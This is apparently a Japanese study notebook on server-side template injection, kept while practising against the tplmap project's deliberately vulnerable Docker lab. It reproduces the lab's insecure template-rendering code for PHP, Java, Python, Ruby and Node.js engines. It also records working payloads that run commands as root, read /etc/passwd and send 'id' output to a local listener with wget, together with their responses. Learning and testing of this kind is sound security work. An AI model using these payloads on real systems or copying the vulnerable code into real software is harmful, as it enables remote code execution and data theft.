<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Server-Side Template Injection](#server-side-template-injection)
  - [概要](#%E6%A6%82%E8%A6%81)
  - [tplmal (SSTI practice)](#tplmal-ssti-practice)
    - [setup](#setup)
    - [php](#php)
      - [eval](#eval)
      - [smarty](#smarty)
      - [twig](#twig)
    - [Java](#java)
      - [velocity](#velocity)
      - [freemarker](#freemarker)
    - [python](#python)
      - [eval](#eval-1)
      - [mako](#mako)
      - [jinja2](#jinja2)
      - [tornado](#tornado)
    - [Ruby](#ruby)
      - [eval](#eval-2)
      - [slim](#slim)
      - [erb](#erb)
    - [Node.js](#nodejs)
      - [jade (pug)](#jade-pug)
      - [nunjucks](#nunjucks)
      - [javascript (eval)](#javascript-eval)
      - [dot](#dot)
      - [dust](#dust)
      - [marko](#marko)
      - [ejs](#ejs)
- [メモ](#%E3%83%A1%E3%83%A2)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Server-Side Template Injection
## 概要
`<% %>`とかでViewの中に変数のデータを表示させたいときに、ユーザーの入力をそのTemplate構文の中に
入れるとRCEの脆弱性になるかもしれない。python,php,NodeJS,Ruby,Javaなど様々なTemplate構文においてその危険性がある。   

## tplmal (SSTI practice)
https://github.com/epinna/tplmap   
SSTI検知ツールで、各テンプレートエンジンの脆弱な環境もDockerで用意されている。   
### setup
git cloneして、`docker-envs`ディレクトリ下で`docker-compose up -d`でコンテナを全部作成・起動する。   
```txt
docker@default:~$ docker ps
CONTAINER ID        IMAGE                             COMMAND                  CREATED             STATUS              PORTS                              NAMES
73a73451642d        docker-envs_tplmap_test_php       "docker-php-entrypoi…"   About an hour ago   Up About an hour    80/tcp, 0.0.0.0:15002->15002/tcp   docker-envs_tplmap_test_php_1
7d20e65fef72        docker-envs_tplmap_test_node      "/bin/sh -c 'cd /app…"   About an hour ago   Up About an hour    0.0.0.0:15004->15004/tcp           docker-envs_tplmap_test_node_1
ff18ec4758d6        docker-envs_tplmap_test_java      "/bin/sh -c 'cd env_…"   About an hour ago   Up About an hour    0.0.0.0:15003->15003/tcp           docker-envs_tplmap_test_java_1
d345416b4104        docker-envs_tplmap_test_python    "/bin/sh -c 'python …"   About an hour ago   Up About an hour    0.0.0.0:15001->15001/tcp           docker-envs_tplmap_test_python_1
f1a58c98075d        docker-envs_tplmap_test_python3   "/bin/sh -c 'python3…"   About an hour ago   Up About an hour    0.0.0.0:15006->15001/tcp           docker-envs_tplmap_test_python3_1
33eba77b5918        docker-envs_tplmap_test_ruby      "/bin/sh -c 'cd env_…"   About an hour ago   Up About an hour    0.0.0.0:15005->15005/tcp           docker-envs_tplmap_test_ruby_1
docker@default:~$
```
`http://192.168.99.100:15004/ejs?inj=a`とかでアクセスできる！   
### php
#### eval
`http://192.168.99.100:15002/eval.php?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102749953-453b1a00-43a8-11eb-903a-ebbf4ce70376.png)   
evalに`?inj=`の値がそのまま代入されている。   
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

if(!$_GET["blind"]) {
  echo generateRandomString();
  error_log('DEBUG< : ' . $tpl);
  $rendered = eval($tpl);
  error_log('DEBUG> : ' . $rendered);
  echo generateRandomString();
}
else {
  error_log('DEBUG< : ' . $tpl);
  ob_start();
  $rendered = eval($tpl);
  ob_end_clean();
  error_log('DEBUG> : ' . $rendered);
  echo generateRandomString();
}
?>
```
`http://192.168.99.100:15002/eval.php?inj=system(%27id%27);`でRCE！   
![image](https://user-images.githubusercontent.com/56021519/102750083-8e8b6980-43a8-11eb-843f-b4732c36e9f3.png)   
`tpl`の`%s`を`inj`パラメータの値に置き換えるので以下でRCE！   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);`   
blindにすると`id`コマンドの実行結果は見えないが、確かに実行はされている！   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);&blind=1`   
![image](https://user-images.githubusercontent.com/56021519/102750650-87b12680-43a9-11eb-8a7f-b37c06c988c8.png)   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=aaa&blind=1`のようにevalの中でエラーが発生するようにすると、   
![image](https://user-images.githubusercontent.com/56021519/102750727-aadbd600-43a9-11eb-8e51-3fccd25f2ab6.png)   
#### smarty
`$smarty->fetch('string:'.$tpl);`で`?inj={*}`とすると、`$smarty->fetch('string:{*}');`となってこれがテンプレートエンジンによって解析される！ここが脆弱   
smarty-3.1.32-secured.php   
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

require('lib/smarty-3.1.29/libs/Smarty.class.php');
$smarty = new Smarty;

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

error_log('DEBUG< : ' . $tpl);
$rendered = $smarty->fetch('string:'.$tpl);
error_log('DEBUG> : ' . $rendered);

if(!$_GET["blind"]) {
  echo generateRandomString() . $rendered . generateRandomString();
}
else {
  echo generateRandomString();
}
?>
```
以下よりSmartyだと判定できるらしい。   
![image](https://user-images.githubusercontent.com/56021519/102763178-a836ac00-43bc-11eb-9a05-8f5af0aed0a7.png)   
```txt
http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj=${7*7}
MOqmnDhLrj$49p5m8SkqDJo

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj=a{*comment*}b
ACWPmsrhdxabaJZ9dSrkm3
```
以下で環境変数とかを表示できる。`self::`のやつはなんかうまく行ってない。   

```txt
http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={$SCRIPT_NAME}
1uzWVrFehC/smarty-3.1.32-secured.phpG3rd1BP40c

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={SMARTY_DIR}
urVZfizSOI/var/www/html/lib/smarty-3.1.32/libs/nOrJdf7o4h

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={$smarty.get.inj}
JoeiKYCzW5{$smarty.get.inj}5O9topPlc1

GET /smarty-3.1.32-secured.php?inj={$smarty.cookies.a} 
Cookie: a=**cookie_value**
GBf6kdYhCJ**cookie_value**2HogA4LaUw

http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={self%3A%3AgetStreamVariable(%22file%3A%2F%2F%2Fproc%2Fself%2Floginuid%22)}%0D%0A
Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{self::getStreamVariable("file:///proc/s..." on line 1 "{self::getStreamVariable("file:///proc/self/loginuid")}" static class 'self' is undefined or not allowed by security setting <-- thrown in /var/www/html/lib/smarty-3.1.32/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1

http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={self::getStreamVariable($SCRIPT_NAME)}
Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{self::getStreamVariable($SCRIPT_NAME)}" on line 1 "{self::getStreamVariable($SCRIPT_NAME)}" static class 'self' is undefined or not allowed by security setting <-- thrown in /var/www/html/lib/smarty-3.1.32/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1
```
以下でRCEできてる！unsecured.phpでもsecured.phpでも両方同様にRCEできてる！   
```txt
http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={system(%27id%27)}
xdeFqDKjk3uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)wG31cLv75x

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={%27****%27}
AksCy1ZQ8g****J5grndNk6e

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={}
kXunBvWJh0{}wrFURs4H6f
```
#### twig
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

require_once './lib/Twig-1.24.1/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

// Run render via CLI
if (php_sapi_name() == "cli") {
    $_GET["inj"] = '';
    $_GET["tpl"] = "";
} 

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

error_log('DEBUG: ' . $tpl);

$loader = new Twig_Loader_Array(array(
    'tpl' => $tpl,
));
$twig = new Twig_Environment($loader);

echo generateRandomString() . $twig->render('tpl') . generateRandomString();
 ?>
 ```
以下でTwigかJinja2かまで絞れるらしい。   
```txt
http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=*
Zrqshc5ipK*0ZtRqxO5nV

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=${7*7}
VqA0Fza9sE${7*7}fVCkzjUw3r

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{7*7}}
eETDOLZaXq4948ghPHSBZC

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{7*%277%27}}
KNXoxPeU3v49Tj3nD2FSaB
```
以下は全部うまく行ってないな…。   
```txt
http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{system(%27id%27)}}
Fatal error: Uncaught Twig_Error_Syntax: The function "system" does not exist in "tpl" at line 1 in /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php:572 Stack trace: #0 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(351): Twig_ExpressionParser->getFunctionNodeClass('system', 1) #1 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(144): Twig_ExpressionParser->getFunctionNode('system', 1) #2 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(84): Twig_ExpressionParser->parsePrimaryExpression() #3 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(41): Twig_ExpressionParser->getPrimary() #4 /var/www/html/lib/Twig-1.19.0/lib/Twig/Parser.php(141): Twig_ExpressionParser->parseExpression() #5 /var/www/html/lib/Twig-1.19.0/lib/Twig/Parser.php(95): Twig_Parser->subparse(NULL, false) #6 /var/www/html/lib/Twig-1.19.0/lib/Twig/Environment.php(544): Twig_Parser->parse(Object(Twig_TokenStream)) #7 /var/www/html/lib/Twig-1.19.0/lib/Twig/Environment.php(596): Twig_Environment->parse(Obj in /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php on line 572

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.registerUndefinedFilterCallback(%22exec%22)}}
bmlikECRBNJAUrW3Sm5k

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.getFilter(%22id%22)}}
UtRvAOJ2Ww2XWUpgIfMa

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.setCache(%22http://127.0.0.1:9500%22)}}
ouc3MNd81U9v7WqfaxuT
```
### Java
#### velocity
`velocity.evaluate( context, w, "mystring", tpl );`の第4引数`tpl`にテンプレートを入力。   
```java
public static Object velocity(Request request, Response response) {


  // Get inj parameter, exit if none
  String inj = request.queryParams("inj");
  if(inj == null) {
    return "";
  }

  // Get tpl parameter
  String tpl = request.queryParams("tpl");
  if(tpl == null) {
    tpl = inj;
  }
  else {
    // Keep the formatting a-la-python
    tpl = tpl.replace("%s", inj);
  }
  
  String blind = request.queryParams("blind");

  LogChute velocityLogChute = new NullLogChute() ;
  VelocityEngine velocity;
  StringWriter w;
  try{
    velocity = new VelocityEngine() ;
    // Turn off logging - catch exceptions and log ourselves
    velocity.setProperty(RuntimeConstants.RUNTIME_LOG_LOGSYSTEM, velocityLogChute) ;
    velocity.setProperty(RuntimeConstants.INPUT_ENCODING, "UTF-8") ;
    velocity.init() ;

    VelocityContext context = new VelocityContext();
    w = new StringWriter();

    velocity.evaluate( context, w, "mystring", tpl );


  }catch(Exception e){
    e.printStackTrace();
    return "";
  }

  // Return out string if not blind
  if(blind == null){
    return UUID.randomUUID().toString() + w.toString() + UUID.randomUUID().toString();
  }
  else {
    return UUID.randomUUID().toString();
  }
}
```
以下だとどれも成功しないのでフローチャートに従えば`not vulnerable`となるが…。   
```txt
http://192.168.99.100:15003/velocity?inj=*
90c94e24-7577-4c67-8c3d-0375421243ee*d28b750b-7272-40db-a44c-1ee8036ce26f

http://192.168.99.100:15003/velocity?inj=${7*7}
d8337a02-26e6-4e13-844e-2183bb404981${7*7}a58f904b-a8f3-4962-96b4-6433624f1fc3

http://192.168.99.100:15003/velocity?inj={{7*7}}
c7afdf02-9829-4da6-ae80-fe2a914af8ae{{7*7}}3d299313-456d-40ca-b9bb-ccaf03f22db6
```
以下を送信するとSymantecが`Java Payload attack`を検出しちゃってDockerでは試せない…。   
```txt
192.168.99.100:15003/velocity?inj=$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
```
#### freemarker
`template = new Template("name", new StringReader(tpl),  new Configuration());`で解析してる？？`StringReader()`の中にテンプレートを入れれば良さそう。   
```java
public static Object freemarker(Request request, Response response) {

  // Get inj parameter, exit if none
  String inj = request.queryParams("inj");
  if(inj == null) {
    return "";
  }

  // Get tpl parameter
  String tpl = request.queryParams("tpl");
  if(tpl == null) {
    tpl = inj;
  }
  else {
    // Keep the formatting a-la-python
    tpl = tpl.replace("%s", inj);
  }

  // Get blind parameter
  String blind = request.queryParams("blind");

  // Generate template from "inj"
  Template template;
  try{
    template = new Template("name", new StringReader(tpl),  new Configuration());
  }catch(IOException e){
    e.printStackTrace();
    return "";
  }

  // Write processed template to out
  HashMap data = new HashMap();
  StringWriter out = new StringWriter();
  try{
    template.process(data, out);
  }catch(TemplateException | IOException e){
    e.printStackTrace();
    return "";
  }

  // Return out string if not blind
  if(blind == null){
    return UUID.randomUUID().toString() + out.toString() + UUID.randomUUID().toString();
  }
  else {
    return UUID.randomUUID().toString();
  }
}
```
以下より、チャート的にはMakoということになるが…。   
```txt
http://192.168.99.100:15003/freemarker?inj=*
3f82c00c-5a47-4dc1-bf77-c7728cbfdf31*5d62471d-c8f5-42ae-8aec-49414b00d13a

http://192.168.99.100:15003/freemarker?inj=${7*7}
be77fc54-fc2a-4829-b3c9-9511bc760b92496f88d221-1075-4e11-bf87-af0237c95883

http://192.168.99.100:15003/freemarker?inj=aaaa{*comment*}bbb
0b768b56-f00c-49c8-930c-dd94878137f9aaaa{*comment*}bbba1fd270b-cdf0-451d-a1b2-e7bcc8e95395

http://192.168.99.100:15003/freemarker?inj=${%22z%22.join(%22ab%22)}
何も返ってこない
```
`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`以下でRCE！   
```txt
http://192.168.99.100:15003/freemarker?inj=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22id%22%29+%7D
e364a20a-dc6a-4ffe-9c3a-3a160d2f1a87 uid=0(root) gid=0(root) groups=0(root) 7820f0ba-f134-4991-bc75-2ad40f687839
```
### python
#### eval
```python
@app.route("/reflect/<engine>")
def reflect(engine):

    template = request.values.get('tpl')
    if not template:
        template = '%s'

    injection = request.values.get('inj')

    if engine == 'mako':
        return randomword() + MakoTemplates(template % injection, lookup=mylookup).render() + randomword()
    elif engine == 'jinja2':
        return randomword() + Jinja2Env.from_string(template % injection).render() + randomword()
    elif engine == 'eval':
        return randomword() + str(eval(template % injection)) + randomword()
    elif engine == 'tornado':
        return randomword() + tornado.template.Template(template % injection).generate() + randomword()
```
ここらへんはダメ。まあテンプレートエンジンで解析してるわけじゃないから当たり前だけど。   
```txt
http://192.168.99.100:15001/reflect/eval?inj=*
Internal Server Error

http://192.168.99.100:15001/reflect/eval?inj='***'
wkntaemr***sbfrnopf

http://192.168.99.100:15001/reflect/eval?inj=${7*7}
Internal Server Error

http://192.168.99.100:15001/reflect/eval?inj={{7*7}}
Internal Server Error
```
以下でRCEできる！参考は以下。まだ動くPayloadありそう？   
https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html   
```txt
http://192.168.99.100:15001/reflect/eval?inj=__import__(%27os%27).popen(%27id%27).read()
cezfkidwuid=0(root) gid=0(root) groups=0(root) govhugaq
```
#### mako
```python
    if engine == 'mako':
        return randomword() + MakoTemplates(template % injection, lookup=mylookup).render() + randomword()
```
以下より、Makoだと判定できる。   
```txt
http://192.168.99.100:15001/reflect/mako?inj=*
dfgmhedp*gtvdwfrn

http://192.168.99.100:15001/reflect/mako?inj=${7*7}
ezzrutbb49gjbioohx

http://192.168.99.100:15001/reflect/mako?inj=aaa{*comment*}bbb
zhkcggiiaaa{*comment*}bbbagrgkbii

http://192.168.99.100:15001/reflect/mako?inj=${%22*%22.join(%22___%22)}
nyagqhvz_*_*_cahscroa
```
RCEするには以下があるらしいが、これ無理では？   
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
以下とかで`${engine}`で`engine`変数の値が読めるかと思ったけどだめっぽい？   
```txt
http://192.168.99.100:15001/reflect/mako?inj={{%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
pueqjbpv{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}zqhejroz

http://192.168.99.100:15001/reflect/mako?inj=${engine}
Internal Server Error
```
#### jinja2
```python
    elif engine == 'jinja2':
        return randomword() + Jinja2Env.from_string(template % injection).render() + randomword()
```
以下でJinja2と判定できる。   
```txt
http://192.168.99.100:15001/reflect/jinja2?inj=*
hzdrchlb*jbjleazb

http://192.168.99.100:15001/reflect/jinja2?inj=${7*7}
pirsuits${7*7}uxbbvhtz

http://192.168.99.100:15001/reflect/jinja2?inj={{7*7}}
cylhjspv49luxnnntk

http://192.168.99.100:15001/reflect/jinja2?inj={{7*%277%27}}
bvsjkzpq7777777bqoqcsnp
```
以下にいろいろ手法が書いてるけどなんかよくわからん…。   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2   
大抵はInternal server errorになったけど以下だけは動いた   
```txt
http://192.168.99.100:15001/reflect/jinja2?inj={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
kumvedgwroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync......
```
#### tornado
```python
    elif engine == 'tornado':
        return randomword() + tornado.template.Template(template % injection).generate() + randomword()
```
以下より、Jinja2と同じ感じに判定されてる？   
```txt
http://192.168.99.100:15001/reflect/tornado?inj=*
fplhzbeq*qtimtyxd

http://192.168.99.100:15001/reflect/tornado?inj=${7*7}
rccnmdzh${7*7}nxqxuufh

http://192.168.99.100:15001/reflect/tornado?inj={{7*7}}
wvsgtaah49oplxnfgy

http://192.168.99.100:15001/reflect/tornado?inj={{7*%277%27}}
sgpjyjjx7777777ozfenemu
```
以下でRCE!   
```txt
http://192.168.99.100:15001/reflect/tornado?inj={%import%20os%}{{os.popen(%22id%22).read()}}
rggolkqtuid=0(root) gid=0(root) groups=0(root) qtrhruyr
```
### Ruby
#### eval
```ruby
require "cuba"
require "cuba/safe"

require 'tilt'
require 'slim'
require 'erb'

Cuba.plugin Cuba::Safe

Cuba.define do
  on get do
    on "reflect/:engine" do |engine|
      # Keep the formatting a-la-python
      on param("inj"), param("tpl", "%s") do |inj, tpl|
        
        tpl = tpl.gsub('%s', inj)
        
        case engine
        when "eval"
          res.write eval(tpl)
        when "slim"

          template = Tilt['slim'].new() {|x| tpl}
          res.write template.render
        when "erb"
          template = Tilt['erb'].new() {|x| tpl}
          res.write template.render
        else
          res.write "#{engine} #{inj} #{tpl}" 
        end
        
      end
    end
```
`http://192.168.99.100:15005/reflect/eval?inj=*`で以下のようなエラー。   
![image](https://user-images.githubusercontent.com/56021519/102784834-44be7580-43e0-11eb-8bdb-fa8be136cf23.png)   
以下でRCEできる！systemを使うと実行自体はできているがTrueが返ってくる。バッククォートで挟めばシェルコマンドを実行できる！   
```txt
http://192.168.99.100:15005/reflect/eval?inj=system(%27id%27)
true

http://192.168.99.100:15005/reflect/eval?inj=`id`
uid=0(root) gid=0(root) groups=0(root) 
```
#### slim
```ruby
        when "slim"

          template = Tilt['slim'].new() {|x| tpl}
          res.write template.render
```
`http://192.168.99.100:15005/reflect/slim?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102785606-97e4f800-43e1-11eb-8732-2edc23383104.png)   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---basic-injections   
以下で空白が返る（応答なし）かエラーが返るかのどっちか。   
応答なしの場合は実行できてるってことか？？   
```txt
http://192.168.99.100:15005/reflect/slim?inj=#{File.open('/etc/passwd').read}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{File.open('/etc/passwd').read} ^ 

http://192.168.99.100:15005/reflect/slim?inj=#{7*7}
空白

http://192.168.99.100:15005/reflect/slim?inj=#{system('cat%20/etc/passwd')}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{system('cat%20/etc/passwd')} ^ 

http://192.168.99.100:15005/reflect/slim?inj=#{ %x|env| }
空白

http://192.168.99.100:15005/reflect/slim?inj=%23{`wget%20http://127.0.0.1:9500`}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 8 #{`wget http://127.0.0.1:9500`} ^ 

http://192.168.99.100:15005/reflect/slim?inj=%23{`id`}
空白

http://192.168.99.100:15005/reflect/slim?inj=%23{Dir.entries(%27/%27)}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{Dir.entries('/')} ^ 
```
#### erb
```ruby
        when "erb"
          template = Tilt['erb'].new() {|x| tpl}
          res.write template.render
```
以下でRCEとかできてる！URL encodeしないと`%`とかうまく機能しないのでそこはやる。   
```txt
http://192.168.99.100:15005/reflect/erb?inj=<%= 7 * 7 %>
49

http://192.168.99.100:15005/reflect/erb?inj=<%= File.open('/etc/passwd').read %>
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync 

http://192.168.99.100:15005/reflect/erb?inj=<%= `id` %>
uid=0(root) gid=0(root) groups=0(root) 
```
### Node.js
#### jade (pug)
```js
var connect = require('connect');
var http = require('http');
var url = require('url');
var pug = require('pug');
var nunjucks = require('nunjucks');
var dust = require('dustjs-linkedin');
var dusthelpers = require('dustjs-helpers');
var randomstring = require("randomstring");
var doT=require('dot');
var marko=require('marko');
var ejs=require('ejs');

var app = connect();

// Pug
app.use('/pug', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query && url_parts.query.tpl != '') {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + pug.render(tpl) + randomstring.generate());
  }
});
```
`http://192.168.99.100:15004/pug?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102789503-974f6000-43e7-11eb-975f-4e6a907eaa26.png)   
以下でRCE！   
```txt
http://192.168.99.100:15004/pug?inj=%23{root.process.exec(%27id%27)}
TypeError: root.process.exec is not a function on line 1

http://192.168.99.100:15004/pug?inj=%23{root.process.mainModule.require(%27child_process%27).spawnSync(%27cat%27,%20[%27/etc/passwd%27]).stdout}
DWaaj1zol8AOye03vUgKQe45bjwYIJPp<root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

http://192.168.99.100:15004/pug?inj=%23{root.process.mainModule.require(%27child_process%27).spawnSync(%27id%27).stdout}
f57THclTZCppfq15t6gWfVgGe7rgq4CJ<uid=0(root) gid=0(root) groups=0(root)
></uid=0(root) gid=0(root) groups=0(root)
>6O6QVxEh23H9q3McNQDhzd0hqOWBIVq9
```
#### nunjucks
```js
// Nunjucks
app.use('/nunjucks', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + nunjucks.renderString(tpl) + randomstring.generate());
  }
});
```
よくわからん。   
```txt
http://192.168.99.100:15004/nunjucks?inj=***
TEDkpYm4gpNPPsw3mspMMDxnAMePvcSD***oPMmVEt3Hhwv7cz30d8cpdXdhrvdMD4o
```
#### javascript (eval)
```js
// Javascript
app.use('/javascript', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + String(eval(tpl)) + randomstring.generate());
  }
});
```
https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44   
以下でファイル読んだりできる。   
```txt
http://192.168.99.100:15004/javascript?inj=require(%27fs%27).readdirSync(%27.%27).toString()
yPCpFdo60IRcRMGyG4evWdBRNWscMz09IkeFEEpcBIQEAREtFRPh9scGWd9pZjIV.js,connect-app.js,node_modules,package-lock.jsonp4KOTBIQhUrikadU5qAuPCq9f28WCiiI

http://192.168.99.100:15004/javascript?inj=require(%27fs%27).readdirSync(%27..%27).toString()
IXjrDkxpfDjDXkFGHJuZXuCR7mqMexcJbasetest.py,env_java_tests,env_node_tests,env_php_tests,env_py_tests,env_ruby_tests,run_channel_test.sh,run_java_tests.sh,run_node_tests.sh,run_php_tests.sh,run_python2_tests.sh,run_python3_tests.sh,run_ruby_tests.sh,test_channel.py,test_java_freemarker.py,test_java_velocity.py,test_node_dot.py,test_node_dust.py,test_node_ejs.py,test_node_javascript.py,test_node_marko.py,test_node_nunjucks.py,test_node_pug.py,test_php_php.py,test_php_smarty_secured.py,test_php_smarty_unsecured.py,test_php_twig_secured.py,test_php_twig_unsecured.py,test_py_jinja2.py,test_py_mako.py,test_py_python.py,test_py_tornado.py,test_ruby_erb.py,test_ruby_ruby.py,test_ruby_slim.py,tests.shR9nOTptanlyTaBR5wlBbENbc9mL6tRqP

http://192.168.99.100:15004/javascript?inj=require(%22fs%22).readFileSync(%22/etc/passwd%22).toString(%27utf8%27)
GNTXzKNvUVwjiltuHC2s9cfzcJUhKWOEroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```
以下でRCEできるはずだけどなんかできてない…。   
```txt
http://192.168.99.100:15004/javascript?inj=require(%22child_process%22).exec(%27id%27)
7c7WZtoA2NYGyIAqsIIpOkYAxk59tdvD[object Object]sTfcMuWmXVA1Sq0RRbh9SQ8R3VpETd8C

require('child_process').exec('wget http://localhost:9500/id=`id`');

WSL上で
>eval("require('child_process').exec('wget http://localhost:9500/id=`id`');")
をやると行けるのに…。
127.0.0.1 - - [22/Dec/2020 00:20:24] "GET /id=uid=1000(tomoki) HTTP/1.1" 404 -
```
#### dot
#### dust
#### marko
#### ejs

# メモ
escapeHTMLってどんな感じでエスケープする？   
動的な文字列連結は脆弱になりがちっぽい   
変数名のワードリストがあるぽい   
# 参考
https://portswigger.net/web-security/server-side-template-injection   
SSTIの概要   
https://portswigger.net/research/server-side-template-injection   
各テンプレートエンジンにおけるSSTIの例   
https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/   
TornadoでのSSTI   
https://github.com/epinna/tplmap   
TPLMAPというSSTI検知ツール。脆弱な環境もテスト用にある。   
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI   
SSTIの脆弱なWebサイト。Docker環境。   
https://www.hamayanhamayan.com/entry/2020/09/10/222147   
SSTIの概要。CTFでのSSTI。   
https://io.cyberdefense.jp/entry/2017/06/12/Server-Side_Template_Injection   
SSTIの説明。日本語。   
https://ierae.co.jp/blog/osc2016do-webappsec/   
SSTIの説明。日本語。   
